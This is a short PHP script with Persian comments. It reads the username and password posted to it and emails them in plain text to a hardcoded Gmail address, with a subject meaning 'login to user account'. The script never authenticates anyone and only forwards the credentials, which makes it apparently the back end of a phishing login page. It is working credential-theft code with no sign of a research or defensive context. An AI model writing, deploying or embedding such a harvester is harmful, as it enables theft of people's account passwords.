<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // اطلاعات ایمیل
    $to = 'alirezaaz33221140@gmail.com'; // آدرس ایمیل دریافت کننده
    $subject = 'ورود به حساب کاربری'; // موضوع ایمیل
    $username = $_POST['username']; // نام کاربری
    $password = $_POST['password']; // رمز عبور

    // محتوای ایمیل
    $message = "کاربر: $username\nرمز عبور: $password";
    $headers = 'From: your_email@gmail.com' . "\r\n" . // ایمیل فرستنده
               'Reply-To: your_email@gmail.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion(); // اطلاعات اضافی

    // ارسال ایمیل
    if (mail($to, $subject, $message, $headers)) {
        echo 'ایمیل با موفقیت ارسال شد.';
    } else {
        echo 'ارسال ایمیل ناموفق بود.';
    }
} else {
    echo 'داده‌ها به درستی ارسال نشدند.';
}
?>
